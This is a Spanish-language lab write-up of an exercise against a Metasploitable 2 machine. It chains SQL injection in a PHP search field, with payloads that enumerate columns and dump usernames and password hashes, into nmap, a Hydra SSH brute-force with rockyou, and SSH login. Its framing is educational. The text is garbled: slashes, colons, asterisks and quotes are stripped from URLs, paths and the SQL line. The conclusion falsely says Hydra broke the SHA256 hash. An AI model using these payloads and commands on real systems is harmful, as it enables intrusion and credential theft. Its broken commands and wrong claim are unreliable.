# 🔥 Laboratorio de Explotación – Aplicación Raymi

## 📅 Fecha del ejercicio
06122025

## 🧠 Objetivo del laboratorio

Explotar una vulnerabilidad de tipo inyección SQL (SQLi) en una aplicación PHP vulnerable (`raymi-landing-php`) alojada en una máquina Metasploitable 2. El objetivo fue acceder a información sensible (usuarios y contraseñas), y luego obtener acceso remoto vía SSH.

---

## 🖥️ Entorno utilizado

- Atacante Kali Linux
- Objetivo Metasploitable 2
- IP de la víctima `192.168.245.129`
- Aplicación vulnerable `http192.168.245.129raymipublicproductos.php`

---

## 🧩 1. Detección de vulnerabilidad

El campo de búsqueda del archivo `productos.php` es vulnerable debido al siguiente código inseguro

```php
$sql = SELECT  FROM productos WHERE nombre LIKE '%$busqueda%';
```

### ✅ Payload efectivo
```
' OR 1=1 -- -
```

Este payload ejecutado en el campo de búsqueda provoca que la consulta SQL devuelva todos los productos.

---

## 🧩 2. Enumeración de columnas con ORDER BY

Se utilizaron pruebas incrementales con el payload `' ORDER BY N -- -` para detectar la cantidad de columnas esperadas por la consulta

- `ORDER BY 6` → funciona
- `ORDER BY 7` → falla

🔐 Número correcto de columnas 6

---

## 🧩 3. Enumeración de columnas de la tabla `usuarios`

Se utilizó `information_schema` para extraer los nombres de columnas de la tabla `usuarios`

### ✅ Payload usado
```sql
' UNION SELECT 1, column_name, '', '', '', '' 
FROM information_schema.columns 
WHERE table_name = 'usuarios' -- -
```

### Resultado
Columnas descubiertas
- id
- username
- email
- password
- rol

---

## 🧩 4. Exfiltración de datos sensibles

Una vez conocidas las columnas, se usó este payload para extraer los usuarios del sistema

### ✅ Payload usado
```sql
' UNION SELECT id, username, email, CAST(password AS CHAR), 
  'httpsvia.placeholder.com150', 'hacked' FROM usuarios -- -
```

Este payload hace que los datos de usuarios se presenten en el frontend como si fueran productos.

### Resultado
```plaintext
Usuario raymi-admin
Email admin@raymi.com
Password (SHA256) ef92b7... (admin123)
```

---

## 🧩 5. Verificación de puerto SSH abierto

### ✅ Comando
```bash
nmap -p 22 192.168.245.129
```

Resultado
```
22tcp open ssh
```

---

## 🧩 6. Fuerza bruta con Hydra

### ✅ Comando
```bash
hydra -l raymi-admin -P usrsharewordlistsrockyou.txt ssh192.168.245.129
```

Resultado
```
[22][ssh] host 192.168.245.129   login raymi-admin   password admin123
```

---

## 🧩 7. Acceso remoto exitoso vía SSH

### ✅ Comando
```bash
ssh raymi-admin@192.168.245.129
```

Contraseña `admin123`

Resultado
```bash
Welcome to Ubuntu
whoami
 raymi-admin
```

---

## 📸 Evidencias sugeridas

- Capturas del campo vulnerable con payload `' OR 1=1 -- -`
- `ORDER BY` mostrando 6 columnas válidas
- Columnas de `usuarios` listadas
- Usuarios extraídos como productos
- Resultado de `nmap`
- Resultado de `hydra`
- Conexión SSH exitosa

---

## 🧾 Conclusión

Se logró explotar exitosamente una inyección SQL para
- Exfiltrar datos críticos (usuarios y contraseñas)
- Romper el hash SHA256 con Hydra
- Obtener acceso remoto como un usuario legítimo (`raymi-admin`)

Este escenario representa un caso clásico de vulnerabilidad en aplicaciones mal desarrolladas que no sanitizan entradas del usuario.

---

## ⚠️ Importante

Toda esta actividad fue realizada con fines educativos, en un entorno controlado. Nunca realices estas pruebas en sistemas sin autorización explícita.

